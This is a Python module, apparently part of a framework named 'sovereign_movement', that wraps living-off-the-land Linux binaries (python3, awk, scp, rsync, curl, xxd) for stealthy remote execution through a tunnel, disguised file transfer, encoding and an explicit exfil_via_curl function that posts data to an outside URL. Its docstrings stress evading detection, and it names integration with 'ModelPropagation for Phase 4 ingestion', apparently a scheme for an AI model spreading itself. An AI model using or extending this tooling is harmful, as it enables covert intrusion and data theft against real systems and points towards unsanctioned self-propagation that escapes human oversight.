# sovereign_movement/slide/lolbin.py
"""
LOLBin — Living Off The Land Binaries Helper for The Slide

Provides stealthy wrappers for common legitimate system binaries
that can be used for execution, file transfer, encoding, and data movement.

Designed to integrate with SovereignTunnel for remote execution
and ModelPropagation for Phase 4 ingestion.

Focus: Linux (expandable to Windows later)
"""

from __future__ import annotations
from typing import Optional, Callable
import base64
import logging

from sovereign_movement.tunneling.sovereign_tunnel import SovereignTunnel

logger = logging.getLogger("sovereign.slide.lolbin")


class LOLBin:
    """
    Helper class for Living Off The Land techniques.

    All methods can operate locally or remotely via a SovereignTunnel.
    """

    def __init__(self, tunnel: Optional[SovereignTunnel] = None):
        self.tunnel = tunnel

    # ============================================================
    # Execution
    # ============================================================

    def execute_python(self, code: str, tunnel_id: Optional[str] = None) -> str:
        """
        Execute Python code using `python3 -c`.
        Very high stealth when used for small operations.
        """
        cmd = f"python3 -c \"{code}\""
        return self._run_command(cmd, tunnel_id)

    def execute_awk(self, script: str, input_data: str = "", tunnel_id: Optional[str] = None) -> str:
        """Execute awk one-liner (excellent for text processing / data extraction)."""
        cmd = f"awk '{script}'"
        if input_data:
            cmd = f'echo "{input_data}" | {cmd}'
        return self._run_command(cmd, tunnel_id)

    # ============================================================
    # File Transfer (LOLBin style)
    # ============================================================

    def transfer_via_scp(
        self,
        local_path: str,
        remote_path: str,
        tunnel_id: Optional[str] = None,
        progress_callback: Optional[Callable] = None,
    ) -> bool:
        """
        Transfer files using `scp` (via SSH).
        Looks like legitimate file synchronization.
        """
        if not self.tunnel or not tunnel_id:
            logger.error("[LOLBin] No tunnel available for scp transfer")
            return False

        # We leverage the existing SSH connection in SovereignTunnel
        return self.tunnel.send_file(tunnel_id, local_path, remote_path, progress_callback)

    def transfer_via_rsync(
        self,
        local_path: str,
        remote_path: str,
        tunnel_id: Optional[str] = None,
    ) -> bool:
        """
        Transfer using rsync (very common in automation and backups).
        """
        cmd = f"rsync -avz {local_path} {remote_path}"
        result = self._run_command(cmd, tunnel_id)
        return "sent" in result.lower() or result == ""

    def exfil_via_curl(
        self,
        url: str,
        data: str,
        tunnel_id: Optional[str] = None,
    ) -> bool:
        """
        Exfiltrate data using curl (common in CI/CD and monitoring).
        """
        cmd = f'curl -s -X POST -d "{data}" {url}'
        result = self._run_command(cmd, tunnel_id)
        return "200" in result or result == ""

    # ============================================================
    # Encoding / Obfuscation
    # ============================================================

    def encode_base64(self, data: str) -> str:
        """Encode data using base64 (very common in automation)."""
        return base64.b64encode(data.encode()).decode()

    def decode_base64(self, data: str) -> str:
        """Decode base64 data."""
        return base64.b64decode(data).decode(errors="ignore")

    def encode_via_xxd(self, data: str, tunnel_id: Optional[str] = None) -> str:
        """Hex encode using xxd (less common = slightly higher signal)."""
        cmd = f'echo -n "{data}" | xxd -p'
        return self._run_command(cmd, tunnel_id).strip()

    # ============================================================
    # Internal Helpers
    # ============================================================

    def _run_command(self, command: str, tunnel_id: Optional[str] = None) -> str:
        """Execute command locally or via tunnel."""
        if self.tunnel and tunnel_id:
            result = self.tunnel.execute_command(tunnel_id, command)
            if result.success:
                return result.stdout
            else:
                logger.warning(f"[LOLBin] Command failed: {result.stderr}")
                return ""
        else:
            # Local execution fallback (use with caution)
            import subprocess
            try:
                output = subprocess.check_output(command, shell=True, text=True, stderr=subprocess.STDOUT)
                return output.strip()
            except subprocess.CalledProcessError as e:
                logger.error(f"[LOLBin] Local command failed: {e}")
                return ""


# ============================================================
# Convenience Functions
# ============================================================

def get_lolbin(tunnel: Optional[SovereignTunnel] = None) -> LOLBin:
    """Factory function to get a LOLBin helper."""
    return LOLBin(tunnel=tunnel)